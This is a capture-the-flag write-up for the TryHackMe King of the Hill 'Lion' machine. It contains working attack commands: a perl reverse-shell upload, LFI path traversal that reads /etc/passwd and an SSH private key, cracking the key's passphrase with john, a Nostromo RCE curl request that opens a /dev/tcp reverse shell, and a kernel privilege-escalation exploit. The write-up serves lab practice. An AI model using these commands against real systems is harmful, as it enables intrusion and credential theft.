# Tryhackme King Of The Hill(koth) Lion
```
writeup for lion machine over at https://tryhackme.com/games/koth

I wont be showing you where the flags are located but they are really easy to find so it shouldn't be too much of a problem
```

# Foothold

## /upload directory as alex
```
we can see there is a /upload directory at port 80 once we dir bust it

uploading a normal php reverse shell is not gonna work in this case

we need to upload a perl reverse shell(https://raw.githubusercontent.com/pentestmonkey/perl-reverse-shell/master/perl-reverse-shell.pl)

change the ip and port and start listening

once you upload the perl reverse shell you will get a shell as alex.

for some reason in the source code it executes the script uploaded with perl.
```

![alt text](https://raw.githubusercontent.com/ozzzozo/writeups/main/thm/koth/Lion/img.png)

## LFI(Local File Inclusion) as gloria
```
there is a LFI at port 5555 with param ?page

we can get the users list by looking in /etc/passwd

http://machineip:5555/?page=../../../../../../../../etc/passwd		

we see there are alex,marty,gloria

out of those 3 users we can get gloria's id_rsa to connect via ssh

http://machineip:5555/?page=../../../../../../../../home/gloria/.ssh/id_rsa

save it to a file
```
```	
chmod 400 id_rsa
ssh2john id_rsa > john
john -w=/usr/share/wordlists/rockyou.txt john; 
```
```
to crack id_rsa password with john
we get passpharse 'dance' for gloria's id_rsa

now we use the id_rsa with passpharse 'dance'

ssh -i id_rsa gloria@machineip -p 1337
```

## Nostromo 1.9.6 vulns - Remote Code Execution as gloria
```
Script:
	https://www.exploit-db.com/exploits/47837

Metasploit:
	exploit/multi/http/nostromo_code_exec

Manual method:
	nc -lnvp someport
	curl -s -X POST 'http://machineip:8080/.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c "/bin/bash -i >& /dev/tcp/yourip/someport 0>&1"' 

can't cd into folders but can ls and cat - we need to get in via ssh
ls /home; to get user names

cat /home/gloria/.ssh/id_rsa; to get gloria's id_rsa for ssh

```
```
chmod 400 id_rsa
ssh2john id_rsa > john
john -w=/usr/share/wordlists/rockyou.txt john; to crack id_rsa password with john
```
```
we get passpharse 'dance' for gloria's id_rsa

now we use the id_rsa with passpharse 'dance'

ssh -i id_rsa gloria@machineip -p 1337 
```

# Getting root
```
we run linpeas to find the following
```

## tmux (gloria only?)
```
/usr/bin/tmux -S /.dev/session attach -t 0
```

## Kernel exploit
```
wget https://github.com/gugronnier/CVE-2017-16995/blob/master/exploit-poc-pentest.c
gcc --static exploit-poc-pentest.c -o exploit-poc-pentest
chmod +x ./exploit-poc-pentest 

upload the binary to the machine and run it to get root.
```
